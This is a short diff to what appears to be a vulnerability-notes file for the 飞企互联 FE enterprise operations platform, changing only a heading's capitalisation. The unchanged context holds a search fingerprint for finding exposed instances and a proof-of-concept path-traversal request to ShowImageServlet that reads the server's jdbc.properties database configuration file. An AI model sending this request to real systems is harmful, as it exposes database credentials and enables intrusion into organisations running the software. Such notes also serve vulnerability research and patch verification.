@@ -5,7 +5,7 @@
 app="飞企互联-FE企业运营管理平台"
 ```
 
-## poc
+## POC
 ```
 /servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties&print
 ```
